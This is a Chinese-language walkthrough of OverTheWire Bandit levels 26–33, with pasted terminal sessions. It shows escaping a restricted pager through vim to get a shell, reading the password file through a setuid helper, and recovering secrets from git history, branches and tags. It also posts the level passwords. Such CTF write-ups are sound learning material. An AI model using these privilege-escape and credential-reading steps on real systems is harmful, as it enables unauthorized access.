33:/home/bandit33:/bin/bashbandit4:x:11004:11004:bandit level 4:/home/bandit4:/bin/bashbandit5:x:11005:11005:bandit level 5:/home/bandit5:/bin/bashbandit6:x:11006:11006:bandit level 6:/home/bandit6:/bin/bashbandit7:x:11007:11007:bandit level 7:/home/bandit7:/bin/bashbandit8:x:11008:11008:bandit level 8:/home/bandit8:/bin/bashbandit9:x:11009:11009:bandit level 9:/home/bandit9:/bin/bashbandit27-git:x:11527:11527::/home/bandit27-git:/usr/bin/git-shellbandit28-git:x:11528:11528::/home/bandit28-git:/usr/bin/git-shellbandit29-git:x:11529:11529::/home/bandit29-git:/usr/bin/git-shellbandit30-git:x:11530:11530::/home/bandit30-git:/usr/bin/git-shellbandit31-git:x:11531:11531::/home/bandit31-git:/usr/bin/git-shell ls有一个ssh私钥连上去之后，连接被关闭了 根据题目提示我们去看/etc/passwd https://blog.csdn.net/yexiangCSDN/article/details/89963698 https://blog.csdn.net/zyy1659949090/article/details/88176215 /etc/passwd这文件里存放里用户相关信息，包括指定登录shell 大概格式为：用户名:口令:用户标识号uid:组标识号gid:注释性描述:主目录:指定登录shell 看到26关这一行是一个showtext 1bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext cat查看发现是设置中断类型为linux 12345678bandit25@bandit:~$ cat /usr/bin/showtext#!/bin/shexport TERM=linuxmore ~/text.txtexit 0bandit25@bandit:~$ tips： more，less，vim的退出来的那个都是可以执行命令的 因为这里是more，所以我们把终端缩小 然后我就卡住了，因为执行的命令都没有回显 最后看别人的攻略，发现是在more的模式下按v，进入vim模式 在vim模式下，用:e /etc/bandit_pass/bandit26导入密码文件，得到如下一行 15czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z 长见识了长见识了 这简直就是个骚操作 // 在ans.txt中 ### level 27123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596bl@bl-virtual-machine:~/wargame$ ssh bandit26@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit26@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \ ; ; / /__./ \ : | . ; / ` ; .'___,/ ,' .--'. ' \' . ; | ; \ ; | | : | /___/ \ | ' ' | : | ; | ' ; |.'; ; ; \ \; : . | ' ' ' : `----' | | \ ; ` | ' ; \; / | ' : ; . \ .\ ; \ \ ', / | | ' \ \ ' \ | ; : / ' : | : ' |--" \ \ .' ; |.' \ \ ; www. `---` ver '---' he '---" ire.org Welcome to OverTheWire!If you find any problems, please report them to Steven or morla onirc.overthewire.org.--[ Playing the games ]-- This machine might hold several wargames. If you are playing "somegame", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command "mktemp -d" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted!4 Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website!--[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall.--[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh--[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \ / _` | '_ \ / _` | | __| / / '_ \ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ Connection to bandit.labs.overthewire.org closed. 用上一关的flag进入这一关，发现连接又被断开了 推测方法跟上一关一样，进入more模式，利用vim模式执行命令 但是这次并不能用:e来读取文件，一i那位权限不够，!command也无法执行 后来查资料发现vim还可以通过设置shell的目录来执行shell的方式 123# vim模式下:set shell=/bin/sh:sh 这样就得到了一个shell，ls发现有一个./bandit27-do程序，推测和以前一样，是要给setuid的程序，尝试一下果然没错，直接用此读取密码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122bl@bl-virtual-machine:~/wargame$ ssh bandit26@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit26@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \ ; ; / /__./ \ : | . ; / ` ; .'___,/ ,' .--'. ' \' . ; | ; \ ; | | : | /___/ \ | ' ' | : | ; | ' ; |.'; ; ; \ \; : . | ' ' ' : `----' | | \ ; ` | ' ; \; / | ' : ; . \ .\ ; \ \ ', / | | ' \ \ ' \ | ; : / ' : | : ' |--" \ \ .' ; |.' \ \ ; www. `---` ver '---' he '---" ire.org Welcome to OverTheWire!If you find any problems, please report them to Steven or morla onirc.overthewire.org.--[ Playing the games ]-- This machine might hold several wargames. If you are playing "somegame", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command "mktemp -d" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted!4 Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website!--[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall.--[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh--[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \ / / !vim _ _ _ _ ___ __ | | | (_) | |__ \ / / !v _ _ _ _ ___ __ | | | (_) | |__ \ / /:!ls _ _ _ _ ___ __ | | | (_) | |__ \ / / | |__ __ _ _ __ __| |_| |_ ) / /_:!ls _ _ _ _ ___ __ | | | (_) | |__ \ / /:sh$ lsbandit27-do text.txt$ cat text.txt _ _ _ _ ___ __ | | | (_) | |__ \ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \ / _` | '_ \ / _` | | __| / / '_ \ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ $ ./bandit27-doRun a command as another user. Example: ./bandit27-do id$ ./bandit27-do iduid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)$ ./bandit27-do cat /etc/bandit_pass/bandit273ba3118a22e93127a4ed485be72ef5ea level 28123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125bl@bl-virtual-machine:~/wargame$ ssh bandit27@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit27@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \ ; ; / /__./ \ : | . ; / ` ; .'___,/ ,' .--'. ' \' . ; | ; \ ; | | : | /___/ \ | ' ' | : | ; | ' ; |.'; ; ; \ \; : . | ' ' ' : `----' | | \ ; ` | ' ; \; / | ' : ; . \ .\ ; \ \ ', / | | ' \ \ ' \ | ; : / ' : | : ' |--" \ \ .' ; |.' \ \ ; www. `---` ver '---' he '---" ire.org Welcome to OverTheWire!If you find any problems, please report them to Steven or morla onirc.overthewire.org.--[ Playing the games ]-- This machine might hold several wargames. If you are playing "somegame", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command "mktemp -d" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted!4 Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website!--[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall.--[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh--[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay!bandit27@bandit:~$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repofatal: could not create work tree dir 'repo': Permission deniedbandit27@bandit:~$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repofatal: could not create work tree dir 'repo': Permission deniedbandit27@bandit:~$ cd /tmpbandit27@bandit:/tmp$ mkdir b27rbandit27@bandit:/tmp$ cd b27rbandit27@bandit:/tmp/b27r$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repoCloning into 'repo'...ssh: connect to host localhost port 2220: Connection refusedfatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists.bandit27@bandit:/tmp/b27r$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repoCloning into 'repo'...Could not create directory '/home/bandit27/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit27-git@localhost's password: remote: Counting objects: 3, done.remote: Compressing objects: 100% (2/2), done.remote: Total 3 (delta 0), reused 0 (delta 0)Receiving objects: 100% (3/3), done.bandit27@bandit:/tmp/b27r$ lsrepobandit27@bandit:/tmp/b27r$ cd repobandit27@bandit:/tmp/b27r/repo$ lsREADMEbandit27@bandit:/tmp/b27r/repo$ bandit27@bandit:/tmp/b27r/repo$ cat READMEThe password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2bandit27@bandit:/tmp/b27r/repo$ 由题目知道git的密码和本关flag一样 很简单的一个git的用法，git支持ssh协议这在之前就已经知道了 所以直接进入bandit27去clone仓库 结果没有权限，以为是端口错了，结果是忘了我们对bandit27的home目录没有读写权限 老办法，去tmp创一个新目录，然后clone，果然成功，flag在repo里的README里 level 29无意的发现 12345678910111213141516bandit12@bandit:~$ lsdata.txtbandit12@bandit:~$ ls /tmp/fuckrepobandit12@bandit:~$ ls /tmp/fuck/repoREADME.mdbandit12@bandit:~$ ls /tmp/fuck/repo/README.md /tmp/fuck/repo/README.mdbandit12@bandit:~$ cat /tmp/fuck/repo/README.md # Bandit NotesSome notes for level29 of bandit.## credentials- username: bandit29- password: bbc96594b4e001778eee9975372716b2 原来是碰巧有人在/tmp/fuck创建了这个git仓库，同道中人啊 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119bl@bl-virtual-machine:~/wargame$ ssh bandit28@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit28@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \ ; ; / /__./ \ : | . ; / ` ; .'___,/ ,' .--'. ' \' . ; | ; \ ; | | : | /___/ \ | ' ' | : | ; | ' ; |.'; ; ; \ \; : . | ' ' ' : `----' | | \ ; ` | ' ; \; / | ' : ; . \ .\ ; \ \ ', / | | ' \ \ ' \ | ; : / ' : | : ' |--" \ \ .' ; |.' \ \ ; www. `---` ver '---' he '---" ire.org Welcome to OverTheWire! Enjoy your stay!bandit28@bandit:~$ lsbandit28@bandit:~$ mkdir /tmp/b28rbandit28@bandit:~$ cd /tmp/b28rbandit28@bandit:/tmp/b28r$ lsbandit28@bandit:/tmp/b28r$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repoCloning into 'repo'...Could not create directory '/home/bandit28/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit28-git@localhost's password: remote: Counting objects: 9, done.remote: Compressing objects: 100% (6/6), done.remote: Total 9 (delta 2), reused 0 (delta 0)Receiving objects: 100% (9/9), done.Resolving deltas: 100% (2/2), done.bandit28@bandit:/tmp/b28r$ lsrepobandit28@bandit:/tmp/b28r$ cd repobandit28@bandit:/tmp/b28r/repo$ lsREADME.mdbandit28@bandit:/tmp/b28r/repo$ cat README.md # Bandit NotesSome notes for level29 of bandit.## credentials- username: bandit29- password: xxxxxxxxxxbandit28@bandit:/tmp/b28r/repo$ ls -altotal 16drwxr-sr-x 3 bandit28 root 4096 Feb 26 04:12 .drwxr-sr-x 3 bandit28 root 4096 Feb 26 04:12 ..drwxr-sr-x 8 bandit28 root 4096 Feb 26 04:12 .git-rw-r--r-- 1 bandit28 root 111 Feb 26 04:12 README.mdbandit28@bandit:/tmp/b28r/repo$ ls .gitbranches description hooks info objects refsconfig HEAD index logs packed-refsbandit28@bandit:/tmp/b28r/repo$ ls .git/branches/bandit28@bandit:/tmp/b28r/repo$ cat .git/HEADref: refs/heads/masterbandit28@bandit:/tmp/b28r/repo$ git logcommit 073c27c130e6ee407e12faad1dd3848a110c4f95Author: Morla Porla &lt;morla@overthewire.org&gt;Date: Tue Oct 16 14:00:39 2018 +0200 fix info leakcommit 186a1038cc54d1358d42d468cdc8e3cc28a93fcbAuthor: Morla Porla &lt;morla@overthewire.org&gt;Date: Tue Oct 16 14:00:39 2018 +0200 add missing datacommit b67405defc6ef44210c53345fc953e6a21338cc7Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Tue Oct 16 14:00:39 2018 +0200 initial commit of README.mdbandit28@bandit:/tmp/b28r/repo$ git revert 186a1038cc54d1358d42d468cdc8e3cc28a93fcberror: could not revert 186a103... add missing datahint: after resolving the conflicts, mark the corrected pathshint: with 'git add &lt;paths&gt;' or 'git rm &lt;paths&gt;'hint: and commit the result with 'git commit'bandit28@bandit:/tmp/b28r/repo$ git reset --hard 186a1038cc54d1358d42d468cdc8e3cc28a93fcbHEAD is now at 186a103 add missing databandit28@bandit:/tmp/b28r/repo$ lsREADME.mdbandit28@bandit:/tmp/b28r/repo$ cat README.md # Bandit NotesSome notes for level29 of bandit.## credentials- username: bandit29- password: bbc96594b4e001778eee9975372716b2bandit28@bandit:/tmp/b28r/repo$ git reset --hard b67405defc6ef44210c53345fc953e6a21338cc7HEAD is now at b67405d initial commit of README.mdbandit28@bandit:/tmp/b28r/repo$ cat README.md # Bandit NotesSome notes for level29 of bandit.## credentials- username: bandit29- password: &lt;TBD&gt;bandit28@bandit:/tmp/b28r/repo$ 老办法，直接tmp目录创建新目录，然后clone 发现README里明显有一个假flagxxxxxx，其他也没啥东西可推测的，题目也就只有一个git的提示，我们便想到git的分支和回滚，查看branch发现没有其他分支，git log发现有以前的提交，利用命令git reset --hard &lt;commit_id&gt;回滚到对应版本，然后cat README.md得到flag：bbc96594b4e001778eee9975372716b2 还可以用git show查看版本差别 level 30123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114 Enjoy your stay!bandit29@bandit:~$ mkdir /tmp/b29rbandit29@bandit:~$ cd /tmp/b29rbandit29@bandit:/tmp/b29r$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repoCloning into 'repo'...Could not create directory '/home/bandit29/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit29-git@localhost's password: remote: Counting objects: 16, done.remote: Compressing objects: 100% (11/11), done.remote: Total 16 (delta 2), reused 0 (delta 0)Receiving objects: 100% (16/16), done.Resolving deltas: 100% (2/2), done.bandit29@bandit:/tmp/b29r$ lsrepobandit29@bandit:/tmp/b29r$ cd repobandit29@bandit:/tmp/b29r/repo$ lsREADME.mdbandit29@bandit:/tmp/b29r/repo$ cat README.md # Bandit NotesSome notes for bandit30 of bandit.## credentials- username: bandit30- password: &lt;no passwords in production!&gt;bandit29@bandit:/tmp/b29r/repo$ git logcommit 84abedc104bbc0c65cb9eb74eb1d3057753e70f8Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Tue Oct 16 14:00:41 2018 +0200 fix usernamecommit 9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Tue Oct 16 14:00:41 2018 +0200 initial commit of README.mdbandit29@bandit:/tmp/b29r/repo$ ls .git/branches/bandit29@bandit:/tmp/b29r/repo$ ls .gitbranches description hooks info objects refsconfig HEAD index logs packed-refsbandit29@bandit:/tmp/b29r/repo$ cat .git/config [core]4repositoryformatversion = 04filemode = true4bare = false4logallrefupdates = true[remote "origin"]4url = ssh://bandit29-git@localhost/home/bandit29-git/repo4fetch = +refs/heads/*:refs/remotes/origin/*[branch "master"]4remote = origin4merge = refs/heads/masterbandit29@bandit:/tmp/b29r/repo$ git reset --hard 84abedc104bbc0c65cb9eb74eb1d3057753e70f8HEAD is now at 84abedc fix usernamebandit29@bandit:/tmp/b29r/repo$ lsREADME.mdbandit29@bandit:/tmp/b29r/repo$ cat README.md # Bandit NotesSome notes for bandit30 of bandit.## credentials- username: bandit30- password: &lt;no passwords in production!&gt;bandit29@bandit:/tmp/b29r/repo$ bandit29@bandit:/tmp/b29r/repo$ cat .git/HEAD ref: refs/heads/masterbandit29@bandit:/tmp/b29r/repo$ git branch* masterbandit29@bandit:/tmp/b29r/repo$ git branch -a* master remotes/origin/HEAD -&gt; origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-devbandit29@bandit:/tmp/b29r/repo$ git checkout origin/devNote: checking out 'origin/dev'.You are in 'detached HEAD' state. You can look around, make experimentalchanges and commit them, and you can discard any commits you make in thisstate without impacting any branches by performing another checkout.If you want to create a new branch to retain commits you create, you maydo so (now or later) by using -b with the checkout command again. Example: git checkout -b &lt;new-branch-name&gt;HEAD is now at 33ce2e9... add data needed for developmentbandit29@bandit:/tmp/b29r/repo$ lscode README.mdbandit29@bandit:/tmp/b29r/repo$ cat README.md # Bandit NotesSome notes for bandit30 of bandit.## credentials- username: bandit30- password: 5b90576bedb2cc04c86a9e924ce42fafbandit29@bandit:/tmp/b29r/repo$ ls codegif2ascii.pybandit29@bandit:/tmp/b29r/repo$ cat code/gif2ascii.py bandit29@bandit:/tmp/b29r/repo$ git log发现就只有两次提交，cat README发现说密码不在production https://www.cnblogs.com/jiangzhaowei/p/7879916.html 这里果然出现了中英的差别，百度才得知production就是我们通常所说的master分支，上文中可以看到git开发中常见的几个分支dev，master，release等 直接git branch -a查看所有分支，切换到dev分支，便得到了flag：5b90576bedb2cc04c86a9e924ce42faf level 3112345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364bandit30@bandit:~$ mkdir /tmp/b30rbandit30@bandit:~$ cd /tmp/b30rbandit30@bandit:/tmp/b30r$ lsbandit30@bandit:/tmp/b30r$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repoCloning into 'repo'...Could not create directory '/home/bandit30/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit30/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit30-git@localhost's password: remote: Counting objects: 4, done.remote: Total 4 (delta 0), reused 0 (delta 0)Receiving objects: 100% (4/4), done.bandit30@bandit:/tmp/b30r$ cd repobandit30@bandit:/tmp/b30r/repo$ lsREADME.mdbandit30@bandit:/tmp/b30r/repo$ cat README.md just an epmty file... muahahabandit30@bandit:/tmp/b30r/repo$ git logcommit 3aa4c239f729b07deb99a52f125893e162daac9eAuthor: Ben Dover &lt;noone@overthewire.org&gt;Date: Tue Oct 16 14:00:44 2018 +0200 initial commit of README.mdbandit30@bandit:/tmp/b30r/repo$ cat .git/config [core]4repositoryformatversion = 04filemode = true4bare = false4logallrefupdates = true[remote "origin"]4url = ssh://bandit30-git@localhost/home/bandit30-git/repo4fetch = +refs/heads/*:refs/remotes/origin/*[branch "master"]4remote = origin4merge = refs/heads/masterbandit30@bandit:/tmp/b30r/repo$ git branch -a* master remotes/origin/HEAD -&gt; origin/master remotes/origin/masterbandit30@bandit:/tmp/b30r/repo$ ls .gitbranches description hooks info objects refsconfig HEAD index logs packed-refsbandit30@bandit:/tmp/b30r/repo$ cat .git/description Unnamed repository; edit this file 'description' to name the repository.bandit30@bandit:/tmp/b30r/repo$ git statusOn branch masterYour branch is up-to-date with 'origin/master'.nothing to commit, working tree cleanbandit30@bandit:/tmp/b30r/repo$ git diff --cacheerror: invalid option: --cachebandit30@bandit:/tmp/b30r/repo$ git diff --cachedbandit30@bandit:/tmp/b30r/repo$ git diffbandit30@bandit:/tmp/b30r/repo$ git diff HEADbandit30@bandit:/tmp/b30r/repo$ git show-ref3aa4c239f729b07deb99a52f125893e162daac9e refs/heads/master3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/HEAD3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/masterf17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secretbandit30@bandit:/tmp/b30r/repo$ git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea47e603bb428404d265f59c42920d81e5bandit30@bandit:/tmp/b30r/repo$ https://cloud.tencent.com/developer/section/1138782 https://www.softwhy.com/article-8540-1.html git show-ref：查看本地引用 得到了奇奇怪怪的新知识了 level 3212345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485bandit31@bandit:~$ mkdir /tmp/b31rbandit31@bandit:~$ cd /tmp/b31rbandit31@bandit:/tmp/b31r$ git clone ssh://bandit31-git@localhosthome/bandit31-git/repoCloning into 'repo'...ssh: Could not resolve hostname localhosthome: No address associated with hostnamefatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists.bandit31@bandit:/tmp/b31r$ lsbandit31@bandit:/tmp/b31r$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repoCloning into 'repo'...Could not create directory '/home/bandit31/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit31-git@localhost's password: remote: Counting objects: 4, done.remote: Compressing objects: 100% (3/3), done.remote: Total 4 (delta 0), reused 0 (delta 0)Receiving objects: 100% (4/4), done.bandit31@bandit:/tmp/b31r$ cd repobandit31@bandit:/tmp/b31r/repo$ lsREADME.mdbandit31@bandit:/tmp/b31r/repo$ cat README.md This time your task is to push a file to the remote repository.Details: File name: key.txt Content: 'May I come in?' Branch: masterbandit31@bandit:/tmp/b31r/repo$ touch key.txtbandit31@bandit:/tmp/b31r/repo$ echo 'May I come in?' &gt;&gt; key.txt bandit31@bandit:/tmp/b31r/repo$ cat key.txt May I come in?bandit31@bandit:/tmp/b31r/repo$ git add key.txt The following paths are ignored by one of your .gitignore files:key.txtUse -f if you really want to add them.bandit31@bandit:/tmp/b31r/repo$ git add -f key.txt bandit31@bandit:/tmp/b31r/repo$ ls -altotal 24drwxr-sr-x 3 bandit31 root 4096 Feb 26 04:47 .drwxr-sr-x 3 bandit31 root 4096 Feb 26 04:46 ..drwxr-sr-x 8 bandit31 root 4096 Feb 26 04:48 .git-rw-r--r-- 1 bandit31 root 6 Feb 26 04:46 .gitignore-rw-r--r-- 1 bandit31 root 15 Feb 26 04:47 key.txt-rw-r--r-- 1 bandit31 root 147 Feb 26 04:46 README.mdbandit31@bandit:/tmp/b31r/repo$ cat .gitignore *.txtbandit31@bandit:/tmp/b31r/repo$ git commit -m "Hello"[master de012c9] Hello 1 file changed, 1 insertion(+) create mode 100644 key.txtbandit31@bandit:/tmp/b31r/repo$ git pushCould not create directory '/home/bandit31/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit31-git@localhost's password: Counting objects: 3, done.Delta compression using up to 4 threads.Compressing objects: 100% (2/2), done.Writing objects: 100% (3/3), 319 bytes | 0 bytes/s, done.Total 3 (delta 0), reused 0 (delta 0)remote: ### Attempting to validate files... ####remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.remote: remote: Well done! Here is the password for the next level:remote: 56a9bf19c63d650ce78e6ec0354ee45eremote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.remote: To ssh://localhost/home/bandit31-git/repo ! [remote rejected] master -&gt; master (pre-receive hook declined)error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'bandit31@bandit:/tmp/b31r/repo$ 这一关目的通过README可看到，是需要push到远程仓库，这对我们再熟悉不过了 不过，这有个坑就是.gitignore，里面忽略了*.txt 用git add -f或删掉.gitignore都行，然后push上去，这操作太骚了，改写了git push失败的返回结果，在结果里给出了flag level 33123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108bl@bl-virtual-machine:~/wargame$ ssh bandit32@bandit.labs.overthewire.org -p 2220This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit32@bandit.labs.overthewire.org's password: Linux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \ ; ; / /__./ \ : | . ; / ` ; .'___,/ ,' .--'. ' \' . ; | ; \ ; | | : | /___/ \ | ' ' | : | ; | ' ; |.'; ; ; \ \; : . | ' ' ' : `----' | | \ ; ` | ' ; \; / | ' : ; . \ .\ ; \ \ ', / | | ' \ \ ' \ | ; : / ' : | : ' |--" \ \ .' ; |.' \ \ ; www. `---` ver '---' he '---" ire.org Welcome to OverTheWire!If you find any problems, please report them to Steven or morla onirc.overthewire.org.--[ Playing the games ]-- This machine might hold several wargames. If you are playing "somegame", 